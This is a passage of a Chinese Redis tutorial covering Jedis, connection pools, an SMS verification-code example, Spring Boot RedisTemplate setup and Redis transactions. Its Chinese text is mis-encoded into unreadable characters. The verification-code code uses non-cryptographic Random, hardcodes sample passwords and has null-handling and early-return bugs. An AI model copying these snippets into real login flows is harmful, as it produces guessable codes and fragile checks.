<groupId>org.junit.jupiter</groupId>\n    <artifactId>junit-jupiter</artifactId>\n    <version>5.8.2</version>\n    <scope>test</scope>\n</dependency>\n```\n\n## 2.ä¸Rediså»ºç«‹è¿æ¥\n\n```java\npublic class JedisTest {\n    public static void main(String[] args) {\n        // è·å–è¿æ¥\n        Jedis jedis = new Jedis(\"127.0.0.1\",6379);\n        // å¦‚æœ Redis æœåŠ¡è®¾ç½®äº†å¯†ç ï¼Œéœ€è¦ä¸‹é¢è¿™è¡Œï¼Œæ²¡æœ‰å°±ä¸éœ€è¦\n        // jedis.auth(\"123456\"); \n        // é€‰æ‹©åº“ï¼ˆé»˜è®¤æ˜¯ä¸‹æ ‡ä¸º0çš„åº“ï¼‰\n        jedis.select(0);\n        System.out.println(\"è¿æ¥æˆåŠŸ\");\n        //æŸ¥çœ‹æœåŠ¡æ˜¯å¦è¿è¡Œ\n        System.out.println(\"æœåŠ¡æ­£åœ¨è¿è¡Œ: \"+jedis.ping());\n        jedis.close();\n    }\n}\n```\n\n## 3.æµ‹è¯•ç›¸å…³æ•°æ®ç±»å‹\n\n> **Jedis-API:  Key**\n\n```java\njedis.set(\"k1\", \"v1\");\njedis.set(\"k2\", \"v2\");\njedis.set(\"k3\", \"v3\");\nSet<String> keys = jedis.keys(\"*\");\nSystem.out.println(keys.size());\nfor (String key : keys) {\n\tSystem.out.println(key);\n}\nSystem.out.println(jedis.exists(\"k1\"));\nSystem.out.println(jedis.ttl(\"k1\"));                \nSystem.out.println(jedis.get(\"k1\"));\n```\n\n> **Jedis-API:  String**\n\n```java\njedis.mset(\"str1\",\"v1\",\"str2\",\"v2\",\"str3\",\"v3\");\nSystem.out.println(jedis.mget(\"str1\",\"str2\",\"str3\"));\n```\n\n> **Jedis-API:  List**\n\n```java\nList<String> list = jedis.lrange(\"mylist\",0,-1);\nfor (String element : list) {\n\tSystem.out.println(element);\n}\n```\n\n>**Jedis-API:  set**\n\n```java\njedis.sadd(\"orders\", \"order01\");\njedis.sadd(\"orders\", \"order02\");\njedis.sadd(\"orders\", \"order03\");\njedis.sadd(\"orders\", \"order04\");\nSet<String> smembers = jedis.smembers(\"orders\");\nfor (String order : smembers) {\nSystem.out.println(order);\n}\njedis.srem(\"orders\", \"order02\");\n```\n\n> **Jedis-API:  hash**\n\n```java\njedis.hset(\"hash1\",\"userName\",\"lisi\");\nSystem.out.println(jedis.hget(\"hash1\",\"userName\"));\nMap<String,String> map = new HashMap<String,String>();\nmap.put(\"telphone\",\"13735679666\");\nmap.put(\"address\",\"beijing\");\nmap.put(\"email\",\"abc@163.com\");\njedis.hmset(\"hash2\",map);\nList<String> result = jedis.hmget(\"hash2\", \"telphone\",\"email\");\nfor (String element : result) {\n\tSystem.out.println(element);\n}\n```\n\n> **Jedis-API:  zset**\n\n```java\njedis.zadd(\"zset01\", 100d, \"z3\");\njedis.zadd(\"zset01\", 90d, \"l4\");\njedis.zadd(\"zset01\", 80d, \"w5\");\njedis.zadd(\"zset01\", 70d, \"z6\");\n\nList<String> zrange = jedis.zrange(\"zset01\", 0, -1);\nfor (String e : zrange) {\n  System.out.println(e);\n}\n```\n\n## 4.Jedisè¿æ¥æ± \n\n---\n\n> **Jedisæœ¬èº«æ˜¯çº¿ç¨‹ä¸å®‰å…¨çš„ï¼Œå¹¶ä¸”é¢‘ç¹çš„åˆ›å»ºå’Œé”€æ¯è¿æ¥ä¼šæœ‰æ€§èƒ½æŸè€—ï¼Œå› æ­¤æ¨èå¤§å®¶ä½¿ç”¨Jedisè¿æ¥æ± ä»£æ›¿Jedisçš„ç›´è¿æ–¹å¼**\n\n```java\npublic class JedisConnectionFactory {\n    private static final JedisPool jedisPool;\n\n    static {\n        //é…ç½®è¿æ¥æ± \n        JedisPoolConfig jedisPoolConfig = new JedisPoolConfig();\n        jedisPoolConfig.setMaxTotal(8);\n        jedisPoolConfig.setMaxIdle(8);\n        jedisPoolConfig.setMinIdle(0);\n        jedisPoolConfig.setMaxWaitMillis(200);\n        //åˆ›å»ºè¿æ¥æ± å¯¹è±¡\n        jedisPool = new JedisPool(jedisPoolConfig,\"127.0.0.1\",6379,1000,\"132537\");\n    }\n\n    public static Jedis getJedis(){\n       return jedisPool.getResource();\n    }\n}\n```\n\n## 5ã€å®ä¾‹â€”æ‰‹æœºéªŒè¯ç \n\n> è¦æ±‚ï¼š\n> 1ã€è¾“å…¥æ‰‹æœºå·ï¼Œç‚¹å‡»å‘é€åéšæœºç”Ÿæˆ6ä½æ•°å­—ç ï¼Œ2åˆ†é’Ÿæœ‰æ•ˆ\n> 2ã€è¾“å…¥éªŒè¯ç ï¼Œç‚¹å‡»éªŒè¯ï¼Œè¿”å›æˆåŠŸæˆ–å¤±è´¥\n> 3ã€æ¯ä¸ªæ‰‹æœºå·æ¯å¤©åªèƒ½è¾“å…¥3æ¬¡\n\næ€è·¯ï¼š\n\n1. ç”Ÿæˆéšæœº6ä½æ•°å­—éªŒè¯ç ï¼šRandom\n2. éªŒè¯ç åœ¨2åˆ†é’Ÿå†…æœ‰æ•ˆï¼šæŠŠéªŒè¯ç æ”¾åˆ°redisé‡Œé¢ï¼Œè®¾ç½®è¿‡æœŸæ—¶é—´120ç§’\n3. åˆ¤æ–­éªŒè¯ç æ˜¯å¦ä¸€è‡´ï¼šä»redisè·å–éªŒè¯ç å’Œè¾“å…¥çš„éªŒè¯ç è¿›è¡Œæ¯”è¾ƒ\n4. æ¯ä¸ªæ‰‹æœºæ¯å¤©åªèƒ½å‘é€3æ¬¡éªŒè¯ç ï¼šincræ¯æ¬¡å‘é€å+1ï¼Œå¤§äº2çš„æ—¶å€™ï¼Œæäº¤ä¸èƒ½å‘é€\n\n**ç”Ÿæˆå…­ä½çš„éªŒè¯ç ï¼š**\n\n```java\n//1.ç”Ÿæˆ6ä½æ•°å­—éªŒè¯ç \npublic static String getCode() {\n    Random random = new Random();\n    String code = \"\";\n    for(int i=0;i<6;i++) {\n        int rand = random.nextInt(10);\n        code += rand;\n    }\n    return code;\n}\n```\n\n**éªŒè¯ç åªèƒ½å‘é€ä¸‰æ¬¡ï¼š**\n\n```java\n//2 æ¯ä¸ªæ‰‹æœºæ¯å¤©åªèƒ½å‘é€ä¸‰æ¬¡ï¼ŒéªŒè¯ç æ”¾åˆ°redisä¸­ï¼Œè®¾ç½®è¿‡æœŸæ—¶é—´120\npublic static void verifyCode(String phone) {\n    //è¿æ¥redis\n    Jedis jedis = new Jedis(\"127.0.0.1\",6379);\n\n    //æ‹¼æ¥key\n    //æ‰‹æœºå‘é€æ¬¡æ•°key\n    String countKey = \"VerifyCode\"+phone+\":count\";\n    //éªŒè¯ç key\n    String codeKey = \"VerifyCode\"+phone+\":code\";\n\n    //æ¯ä¸ªæ‰‹æœºæ¯å¤©åªèƒ½å‘é€ä¸‰æ¬¡\n    String count = jedis.get(countKey);\n    if(count == null) {\n        //æ²¡æœ‰å‘é€æ¬¡æ•°ï¼Œç¬¬ä¸€æ¬¡å‘é€\n        //è®¾ç½®å‘é€æ¬¡æ•°æ˜¯1\n        jedis.setex(countKey,24*60*60,\"1\");\n    } else if(Integer.parseInt(count)<=2) {\n        //å‘é€æ¬¡æ•°+1\n        jedis.incr(countKey);\n    } else if(Integer.parseInt(count)>2) {\n        //å‘é€ä¸‰æ¬¡ï¼Œä¸èƒ½å†å‘é€\n        System.out.println(\"ä»Šå¤©å‘é€æ¬¡æ•°å·²ç»è¶…è¿‡ä¸‰æ¬¡\");\n        jedis.close();\n    }\n\n    //å‘é€éªŒè¯ç æ”¾åˆ°redisé‡Œé¢\n    String vcode = getCode();\n    jedis.setex(codeKey,120,vcode);//120ç§’\n    jedis.close();\n}\n\n```\n\n**åˆ¤æ–­éªŒè¯ç æ˜¯å¦ä¸€è‡´ï¼š**\n\n```java\n//3 éªŒè¯ç æ ¡éªŒ\npublic static void judgeCode(String phone,String code) {\n    //ä»redisè·å–éªŒè¯ç \n    Jedis jedis = new Jedis(\"127.0.0.1\",6379);\n    //éªŒè¯ç key\n    String codeKey = \"VerifyCode\"+phone+\":code\";\n    String redisCode = jedis.get(codeKey);\n    //åˆ¤æ–­\n    if(redisCode.equals(code)) {\n        System.out.println(\"æˆåŠŸ\");\n    }else {\n        System.out.println(\"å¤±è´¥\");\n    }\n    jedis.close();\n}\n```\n\n**å®Œæ•´åŠŸèƒ½ä»£ç å±•ç¤º**\n\n```java\npublic class PhoneCode {\n\n    public static void main(String[] args) {\n        //æ¨¡æ‹ŸéªŒè¯ç å‘é€\n        verifyCode(\"13678765435\");\n\n        //æ¨¡æ‹ŸéªŒè¯ç æ ¡éªŒ\n        //judgeCode(\"13678765435\",\"217173\");\n    }\n\n\n    //3 éªŒè¯ç æ ¡éªŒ\n    public static void judgeCode(String phone,String code) {\n        //ä»redisè·å–éªŒè¯ç \n        Jedis jedis = new Jedis(\"127.0.0.1\",6379);\n        //éªŒè¯ç key\n        String codeKey = \"VerifyCode\"+phone+\":code\";\n        String redisCode = jedis.get(codeKey);\n        //åˆ¤æ–­\n        if(redisCode.equals(code)) {\n            System.out.println(\"æˆåŠŸ\");\n        }else {\n            System.out.println(\"å¤±è´¥\");\n        }\n        jedis.close();\n    }\n\n    //2 æ¯ä¸ªæ‰‹æœºæ¯å¤©åªèƒ½å‘é€ä¸‰æ¬¡ï¼ŒéªŒè¯ç æ”¾åˆ°redisä¸­ï¼Œè®¾ç½®è¿‡æœŸæ—¶é—´120\n    public static void verifyCode(String phone) {\n        //è¿æ¥redis\n        Jedis jedis = new Jedis(\"127.0.0.1\",6379);\n\n        //æ‹¼æ¥key\n        //æ‰‹æœºå‘é€æ¬¡æ•°key\n        String countKey = \"VerifyCode\"+phone+\":count\";\n        //éªŒè¯ç key\n        String codeKey = \"VerifyCode\"+phone+\":code\";\n\n        //æ¯ä¸ªæ‰‹æœºæ¯å¤©åªèƒ½å‘é€ä¸‰æ¬¡\n        String count = jedis.get(countKey);\n        if(count == null) {\n            //æ²¡æœ‰å‘é€æ¬¡æ•°ï¼Œç¬¬ä¸€æ¬¡å‘é€\n            //è®¾ç½®å‘é€æ¬¡æ•°æ˜¯1\n            jedis.setex(countKey,24*60*60,\"1\");//æœ‰æ•ˆæœŸ1å¤©\n        } else if(Integer.parseInt(count)<=2) {\n            //å‘é€æ¬¡æ•°+1\n            jedis.incr(countKey);\n        } else if(Integer.parseInt(count)>2) {\n            //å‘é€ä¸‰æ¬¡ï¼Œä¸èƒ½å†å‘é€\n            System.out.println(\"ä»Šå¤©å‘é€æ¬¡æ•°å·²ç»è¶…è¿‡ä¸‰æ¬¡\");\n            jedis.close();\n            return;//è¶…è¿‡ä¸‰æ¬¡ä¹‹åå°±ä¼šè‡ªåŠ¨é€€å‡ºä¸ä¼šå†å‘é€äº†ï¼Œä¸æ·»åŠ è¿™ä¸€è¡Œï¼Œå³ä½¿æ˜¾ç¤ºå‘é€æ¬¡æ•°ï¼Œä½†è¿˜ä¼šæœ‰éªŒè¯ç è¿˜æ˜¯ä¼šæ”¹å˜\n        }\n\n        //å‘é€éªŒè¯ç æ”¾åˆ°redisé‡Œé¢\n        String vcode = getCode();//è°ƒç”¨ç”Ÿæˆçš„éªŒè¯ç \n        jedis.setex(codeKey,120,vcode);//è®¾ç½®ç”Ÿæˆçš„éªŒè¯ç åªæœ‰120ç§’çš„æ—¶é—´\n        jedis.close();\n    }\n\n    //1 ç”Ÿæˆ6ä½æ•°å­—éªŒè¯ç ï¼Œcodeæ˜¯éªŒè¯ç \n    public static String getCode() {\n        Random random = new Random();\n        String code = \"\";\n        for(int i=0;i<6;i++) {\n            int rand = random.nextInt(10);\n            code += rand;\n        }\n        return code;\n    }\n}\n```\n\n# äº”ã€Redisä¸Spring Bootæ•´åˆ\n\n## 1ã€å¼•å…¥redisç›¸å…³ä¾èµ–\n\n```xml\n<!-- redis -->\n<dependency>\n<groupId>org.springframework.boot</groupId>\n<artifactId>spring-boot-starter-data-redis</artifactId>\n</dependency>\n\n<!--è¿æ¥æ± ä¾èµ–-->\n<dependency>\n<groupId>org.apache.commons</groupId>\n<artifactId>commons-pool2</artifactId>\n<version>2.6.0</version>\n</dependency>\n```\n\n## 2ã€ç¼–å†™é…ç½®æ–‡ä»¶\n\napplication.yml ç‰ˆæœ¬\n\n```yaml\nspring:\n  redis:\n    host: 127.0.0.1 #æŒ‡å®šredisæ‰€åœ¨çš„host\n    port: 6379  #æŒ‡å®šredisçš„ç«¯å£\n    password: 123456  #è®¾ç½®rediså¯†ç \n    lettuce:\n      pool:\n        max-active: 8 #æœ€å¤§è¿æ¥æ•°\n        max-idle: 8 #æœ€å¤§ç©ºé—²æ•°\n        min-idle: 0 #æœ€å°ç©ºé—²æ•°\n        max-wait: 100ms #è¿æ¥ç­‰å¾…æ—¶é—´\n```\n\napplication.properties ç‰ˆæœ¬\n\n```properties\n#RedisæœåŠ¡å™¨åœ°å€\nspring.redis.host=127.0.0.1\n#RedisæœåŠ¡å™¨è¿æ¥ç«¯å£\nspring.redis.port=6379\n#Redisæ•°æ®åº“ç´¢å¼•ï¼ˆé»˜è®¤ä¸º0ï¼‰\nspring.redis.database= 0\n#è¿æ¥è¶…æ—¶æ—¶é—´ï¼ˆæ¯«ç§’ï¼‰\nspring.redis.timeout=1800000\n#è¿æ¥æ± æœ€å¤§è¿æ¥æ•°ï¼ˆä½¿ç”¨è´Ÿå€¼è¡¨ç¤ºæ²¡æœ‰é™åˆ¶ï¼‰\nspring.redis.lettuce.pool.max-active=20\n#æœ€å¤§é˜»å¡ç­‰å¾…æ—¶é—´(è´Ÿæ•°è¡¨ç¤ºæ²¡é™åˆ¶)\nspring.redis.lettuce.pool.max-wait=-1\n#è¿æ¥æ± ä¸­çš„æœ€å¤§ç©ºé—²è¿æ¥\nspring.redis.lettuce.pool.max-idle=5\n#è¿æ¥æ± ä¸­çš„æœ€å°ç©ºé—²è¿æ¥\nspring.redis.lettuce.pool.min-idle=0\n```\n\n## **3ã€ç¼–å†™æµ‹è¯•ç±»**\n\n```java\n@SpringBootTest\nclass SpringRedisApplicationTests {\n    @Resource\n    private RedisTemplate redisTemplate;\n    @Test\n    void testString() {\n        // 1.é€šè¿‡RedisTemplateè·å–æ“ä½œStringç±»å‹çš„ValueOperationså¯¹è±¡\n        ValueOperations ops = redisTemplate.opsForValue();\n        // 2.æ’å…¥ä¸€æ¡æ•°æ®\n        ops.set(\"name\",\"jianjian\");\n        // 3.è·å–æ•°æ®\n        String name = (String) ops.get(\"name\");\n        System.out.println(\"name = \" + name);\n    }\n}\n```\n\n## \t4ã€RedisSerializeré…ç½®\n\n---\n\n> **RedisTemplateå¯ä»¥æ¥æ”¶ä»»æ„Objectä½œä¸ºå€¼å†™å…¥Redisï¼Œåªä¸è¿‡å†™å…¥å‰ä¼šæŠŠObjectåºåˆ—åŒ–ä¸ºå­—èŠ‚å½¢å¼ï¼Œ`é»˜è®¤æ˜¯é‡‡ç”¨JDKåºåˆ—åŒ–`ï¼Œå¾—åˆ°çš„ç»“æœæ˜¯è¿™æ ·çš„**\n\n![](https://img.jwt1399.top/img/202207181557941.png)\n\n**ç¼ºç‚¹ï¼š**\n\n- å¯è¯»æ€§å·®\n- å†…å­˜å ç”¨è¾ƒå¤§\n\n> **é‚£ä¹ˆå¦‚ä½•è§£å†³ä»¥ä¸Šçš„é—®é¢˜å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥é€šè¿‡è‡ªå®šä¹‰RedisTemplateåºåˆ—åŒ–çš„æ–¹å¼æ¥è§£å†³ã€‚**\n\n**ç¼–å†™ä¸€ä¸ªé…ç½®ç±»`RedisConfig`**\n\n```java\n@Configuration\npublic class RedisConfig {\n\n    @Bean\n    public RedisTemplate<String,Object> redisTemplate(RedisConnectionFactory factory){\n        // 1.åˆ›å»ºRedisTemplateå¯¹è±¡\n        RedisTemplate<String ,Object> redisTemplate = new RedisTemplate<>();\n        // 2.è®¾ç½®è¿æ¥å·¥å‚\n        redisTemplate.setConnectionFactory(factory);\n\n        // 3.åˆ›å»ºåºåˆ—åŒ–å¯¹è±¡\n        StringRedisSerializer stringRedisSerializer = new StringRedisSerializer();\n        GenericJackson2JsonRedisSerializer genericJackson2JsonRedisSerializer = new GenericJackson2JsonRedisSerializer();\n\n        // 4.è®¾ç½®keyå’ŒhashKeyé‡‡ç”¨Stringçš„åºåˆ—åŒ–æ–¹å¼\n        redisTemplate.setKeySerializer(stringRedisSerializer);\n        redisTemplate.setHashKeySerializer(stringRedisSerializer);\n\n        // 5.è®¾ç½®valueå’ŒhashValueé‡‡ç”¨jsonçš„åºåˆ—åŒ–æ–¹å¼\n        redisTemplate.setValueSerializer(genericJackson2JsonRedisSerializer);\n        redisTemplate.setHashValueSerializer(genericJackson2JsonRedisSerializer);\n\n        return redisTemplate;\n    }\n}\n```\n\n**æ­¤æ—¶æˆ‘ä»¬å·²ç»å°†RedisTemplateçš„keyè®¾ç½®ä¸º`Stringåºåˆ—åŒ–`ï¼Œvalueè®¾ç½®ä¸º`Jsonåºåˆ—åŒ–`çš„æ–¹å¼ï¼Œå†æ¥æ‰§è¡Œæ–¹æ³•æµ‹è¯•**\n\n![](https://img.jwt1399.top/img/202207181557925.png)\n\n**ç”±äºæˆ‘ä»¬è®¾ç½®çš„valueåºåˆ—åŒ–æ–¹å¼æ˜¯Jsonçš„ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ç›´æ¥å‘redisä¸­æ’å…¥ä¸€ä¸ªå¯¹è±¡**\n\n```java\n@Test\nvoid testSaveUser() {\n    redisTemplate.opsForValue().set(\"user:100\", new User(\"Vz\", 21));\n    User user = (User) redisTemplate.opsForValue().get(\"user:100\");\n    System.out.println(\"User = \" + user);\n}\n```\n\n![](https://img.jwt1399.top/img/202207181609335.png)\n\nå°½ç®¡Jsonåºåˆ—åŒ–å¯ä»¥æ»¡è¶³æˆ‘ä»¬çš„éœ€æ±‚ï¼Œä½†æ˜¯ä¾æ—§å­˜åœ¨ä¸€äº›é—®é¢˜ã€‚\n\nå¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œä¸ºäº†åœ¨ååºåˆ—åŒ–æ—¶çŸ¥é“å¯¹è±¡çš„ç±»å‹ï¼ŒJSONåºåˆ—åŒ–å™¨ä¼šå°†ç±»çš„classç±»å‹å†™å…¥jsonç»“æœä¸­ï¼Œå­˜å…¥Redisï¼Œä¼šå¸¦æ¥é¢å¤–çš„å†…å­˜å¼€é”€ã€‚\n\né‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•è§£å†³è¿™ä¸ªé—®é¢˜å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸‹æ–‡çš„`StringRedisTemplate`æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚\n\n## 5ã€StringRedisTemplateé…ç½®\n\n> **ä¸ºäº†èŠ‚çœå†…å­˜ç©ºé—´ï¼Œæˆ‘ä»¬å¹¶ä¸ä¼šä½¿ç”¨JSONåºåˆ—åŒ–å™¨æ¥å¤„ç†valueï¼Œè€Œæ˜¯ç»Ÿä¸€ä½¿ç”¨Stringåºåˆ—åŒ–å™¨ï¼Œè¦æ±‚åªèƒ½å­˜å‚¨Stringç±»å‹çš„keyå’Œvalueã€‚å½“éœ€è¦å­˜å‚¨Javaå¯¹è±¡æ—¶ï¼Œæ‰‹åŠ¨å®Œæˆå¯¹è±¡çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚**\n\n![](https://img.jwt1399.top/img/202207181939756.png)\n\n> **Springé»˜è®¤æä¾›äº†ä¸€ä¸ªStringRedisTemplateç±»ï¼Œå®ƒçš„keyå’Œvalueçš„åºåˆ—åŒ–æ–¹å¼é»˜è®¤å°±æ˜¯Stringæ–¹å¼ã€‚çœå»äº†æˆ‘ä»¬è‡ªå®šä¹‰RedisTemplateçš„è¿‡ç¨‹**\n\n**ç¼–å†™ä¸€ä¸ªæµ‹è¯•ç±»ä½¿ç”¨StringRedisTemplateæ¥æ‰§è¡Œä»¥ä¸‹æ–¹æ³•**\n\n```java\n@SpringBootTest\nclass RedisStringTemplateTest {\n\n\t@Resource\n\tprivate StringRedisTemplate stringRedisTemplate;\n\n\t@Test\n\tvoid testSaveUser() throws JsonProcessingException {\n\t\t// 1.åˆ›å»ºä¸€ä¸ªJsonåºåˆ—åŒ–å¯¹è±¡\n\t\tObjectMapper objectMapper = new ObjectMapper();\n\t\t// 2.å°†è¦å­˜å…¥çš„å¯¹è±¡é€šè¿‡Jsonåºåˆ—åŒ–å¯¹è±¡è½¬æ¢ä¸ºå­—ç¬¦ä¸²\n\t\tString userJson1 = objectMapper.writeValueAsString(new User(\"Vz\", 21));\n\t\t// 3.é€šè¿‡StringRedisTemplateå°†æ•°æ®å­˜å…¥redis\n\t\tstringRedisTemplate.opsForValue().set(\"user:100\",userJson1);\n\t\t// 4.é€šè¿‡keyå–å‡ºvalue\n\t\tString userJson2 = stringRedisTemplate.opsForValue().get(\"user:100\");\n\t\t// 5.ç”±äºå–å‡ºçš„å€¼æ˜¯Stringç±»å‹çš„Jsonå­—ç¬¦ä¸²ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦é€šè¿‡Jsonåºåˆ—åŒ–å¯¹è±¡æ¥è½¬æ¢ä¸ºjavaå¯¹è±¡\n\t\tUser user = objectMapper.readValue(userJson2, User.class);\n\t\t// 6.æ‰“å°ç»“æœ\n\t\tSystem.out.println(\"user = \" + user);\n\t}\n}\n```\n\n**æ‰§è¡Œå®Œæ¯•å›åˆ°Redisçš„å›¾å½¢åŒ–å®¢æˆ·ç«¯æŸ¥çœ‹ç»“æœ**\n\n![](https://img.jwt1399.top/img/202212022044794.png)\n\n# å…­ã€äº‹åŠ¡ & é”\n\n- Redis äº‹åŠ¡æ˜¯ä¸€ä¸ªå•ç‹¬çš„éš”ç¦»æ“ä½œï¼šäº‹åŠ¡ä¸­çš„æ‰€æœ‰å‘½ä»¤éƒ½ä¼šåºåˆ—åŒ–ã€æŒ‰é¡ºåºåœ°æ‰§è¡Œã€‚\n\n- äº‹åŠ¡åœ¨æ‰§è¡Œçš„è¿‡ç¨‹ä¸­ï¼Œä¸ä¼šè¢«å…¶ä»–å®¢æˆ·ç«¯å‘é€æ¥çš„å‘½ä»¤è¯·æ±‚æ‰€æ‰“æ–­ã€‚\n\n- Redis äº‹åŠ¡çš„ä¸»è¦ä½œç”¨å°±æ˜¯ä¸²è”å¤šä¸ªå‘½ä»¤é˜²æ­¢åˆ«çš„å‘½ä»¤æ’é˜Ÿã€‚\n\n## 1.multiã€execã€discard\n\nä»è¾“å…¥ Multi å‘½ä»¤å¼€å§‹ï¼Œè¾“å…¥çš„å‘½ä»¤éƒ½ä¼šä¾æ¬¡è¿›å…¥å‘½ä»¤é˜Ÿåˆ—ä¸­ï¼Œä½†ä¸ä¼šæ‰§è¡Œï¼Œç›´åˆ°è¾“å…¥ Exec åï¼ŒRedis ä¼šå°†ä¹‹å‰çš„å‘½ä»¤é˜Ÿåˆ—ä¸­çš„å‘½ä»¤ä¾æ¬¡æ‰§è¡Œã€‚ç»„é˜Ÿçš„è¿‡ç¨‹ä¸­å¯ä»¥é€šè¿‡discardæ¥æ”¾å¼ƒç»„é˜Ÿã€‚ \n\n![](https://img.jwt1399.top/img/202207262126943.png)\n\n```bash\n127.0.0.1:6379[1]> multi\nOK\n127.0.0.1:6379[1](TX)> set k1 v1\nQUEUED\n127.0.0.1:6379[1](TX)> set k2 v2\nQUEUED\n127.0.0.1:6379[1](TX)> exec\n1) OK\n2) OK\n```\n\n## 2.é”™è¯¯å¤„ç†\n\nç»„é˜Ÿä¸­æŸä¸ªå‘½ä»¤å‡ºç°äº†æŠ¥å‘Šé”™è¯¯ï¼Œæ‰§è¡Œæ—¶æ•´ä¸ªçš„æ‰€æœ‰é˜Ÿåˆ—éƒ½ä¼šè¢«å–æ¶ˆã€‚\n\n```bash\n127.0.0.1:6379[1]> multi\nOK\n127.0.0.1:6379[1](TX)> set m1 v1\nQUEUED\n127.0.0.1:6379[1](TX)> set m2\n(error) ERR wrong number of arguments for 'set' command\n127.0.0.1:6379[1](TX)> set m3 v3\nQUEUED\n127.0.0.1:6379[1](TX)> exec\n(error) EXECABORT Transaction discarded because of previous errors.\n```\n\nå¦‚æœæ‰§è¡Œé˜¶æ®µæŸä¸ªå‘½ä»¤æŠ¥å‡ºäº†é”™è¯¯ï¼Œåˆ™åªæœ‰æŠ¥é”™çš„å‘½ä»¤ä¸ä¼šè¢«æ‰§è¡Œï¼Œè€Œå…¶ä»–çš„å‘½ä»¤éƒ½ä¼šæ‰§è¡Œï¼Œä¸ä¼šå›æ»šã€‚\n\n```bash\n127.0.0.1:6379[1]> multi\nOK\n127.0.0.1:6379[1](TX)> set m1 v1\nQUEUED\n127.0.0.1:6379[1](TX)> incr m1 #é”™è¯¯è¯­å¥\nQUEUED\n127.0.0.1:6379[1](TX)> set m2 v2\nQUEUED\n127.0.0.1:6379[1](TX)> exec\n1) OK\n2) (error) ERR value is not an integer or out of range\n3) OK\n```\n\n## 3.äº‹åŠ¡å†²çªçš„é—®é¢˜\n\næƒ³æƒ³ä¸€ä¸ªåœºæ™¯ï¼šæœ‰å¾ˆå¤šäººæœ‰ä½ çš„è´¦æˆ·,åŒæ—¶å»å‚åŠ åŒåä¸€æŠ¢è´­\n\nä¸€ä¸ªè¯·æ±‚æƒ³ç»™é‡‘é¢å‡8000\n\nä¸€ä¸ªè¯·æ±‚æƒ³ç»™é‡‘é¢å‡5000\n\nä¸€ä¸ªè¯·æ±‚æƒ³ç»™é‡‘é¢å‡1000\n\n![](https://img.jwt1399.top/img/202208311123818.png)\n\nè¿™æ ·å°±ä¼šå¯¼è‡´äº‹åŠ¡å†²çªï¼Œå¦‚ä½•è§£å†³å‘¢ï¼Ÿ\n\n### 3.1 æ‚²è§‚é”\n\n**æ‚²è§‚é”(Pessimistic Lock)**, æ¯æ¬¡å»æ‹¿æ•°æ®çš„æ—¶å€™éƒ½è®¤ä¸ºåˆ«äººä¼šä¿®æ”¹ï¼Œæ‰€ä»¥æ¯æ¬¡åœ¨æ‹¿æ•°æ®çš„æ—¶å€™éƒ½ä¼šä¸Šé”ï¼Œè¿™æ ·åˆ«äººæƒ³æ‹¿è¿™ä¸ªæ•°æ®å°±ä¼š block ç›´åˆ°å®ƒæ‹¿åˆ°é”ã€‚\n\n![](https://img.jwt1399.top/img/202208311123265.png)\n\næ‚²è§‚é”å¯ä»¥å®ç°å¯¹äºæ•°æ®çš„ä¸²è¡ŒåŒ–æ‰§è¡Œï¼Œæ¯”å¦‚synï¼Œå’Œlockéƒ½æ˜¯æ‚²è§‚é”çš„ä»£è¡¨ï¼ŒåŒæ—¶ï¼Œæ‚²è§‚é”ä¸­åˆå¯ä»¥å†ç»†åˆ†ä¸ºå…¬å¹³é”ï¼Œéå…¬å¹³é”ï¼Œå¯é‡å…¥é”ï¼Œç­‰ç­‰\n\n### 3.2 ä¹è§‚é”\n\n**ä¹è§‚é”(Optimistic Lock)**ï¼Œæ¯æ¬¡å»æ‹¿æ•°æ®çš„æ—¶å€™éƒ½è®¤ä¸ºåˆ«äººä¸ä¼šä¿®æ”¹ï¼Œæ‰€ä»¥ä¸ä¼šä¸Šé”ï¼Œä½†æ˜¯åœ¨æ›´æ–°çš„æ—¶å€™ä¼šåˆ¤æ–­ä¸€ä¸‹åœ¨æ­¤æœŸé—´åˆ«äººæœ‰æ²¡æœ‰å»æ›´æ–°è¿™ä¸ªæ•°æ®ï¼Œå¯ä»¥ä½¿ç”¨ç‰ˆæœ¬å·ç­‰æœºåˆ¶ã€‚**ä¹è§‚é”é€‚ç”¨äºå¤šè¯»çš„åº”ç”¨ç±»å‹ï¼Œè¿™æ ·å¯ä»¥æé«˜ååé‡**ã€‚\n\n![](https://img.jwt1399.top/img/202208311124559.png)\n\nä¹è§‚é”ï¼šä¼šæœ‰ä¸€ä¸ªç‰ˆæœ¬å·ï¼Œæ¯æ¬¡æ“ä½œæ•°æ®ä¼šå¯¹ç‰ˆæœ¬å·+1ï¼Œå†æäº¤å›æ•°æ®æ—¶ï¼Œä¼šå»æ ¡éªŒæ˜¯å¦æ¯”ä¹‹å‰çš„ç‰ˆæœ¬å¤§1 ï¼Œå¦‚æœå¤§1 ï¼Œåˆ™è¿›è¡Œæ“ä½œæˆåŠŸï¼Œè¿™å¥—æœºåˆ¶çš„æ ¸å¿ƒé€»è¾‘åœ¨äºï¼Œå¦‚æœåœ¨æ“ä½œè¿‡ç¨‹ä¸­ï¼Œç‰ˆæœ¬å·åªæ¯”åŸæ¥å¤§1 ï¼Œé‚£ä¹ˆå°±æ„å‘³ç€æ“ä½œè¿‡ç¨‹ä¸­æ²¡æœ‰äººå¯¹ä»–è¿›è¡Œè¿‡ä¿®æ”¹ï¼Œä»–çš„æ“ä½œå°±æ˜¯å®‰å…¨çš„ï¼Œå¦‚æœä¸å¤§1ï¼Œåˆ™æ•°æ®è¢«ä¿®æ”¹è¿‡ã€‚\n\nä¹è§‚é”çš„å…¸å‹ä»£è¡¨ï¼šå°±æ˜¯CASï¼ˆ**Compare And Swap**ï¼‰ï¼Œåˆ©ç”¨casè¿›è¡Œæ— é”åŒ–æœºåˆ¶åŠ é”ï¼Œvar5 æ˜¯æ“ä½œå‰è¯»å–çš„å†…å­˜å€¼ï¼Œwhileä¸­çš„var1+var2 æ˜¯é¢„ä¼°å€¼ï¼Œå¦‚æœé¢„ä¼°å€¼ == 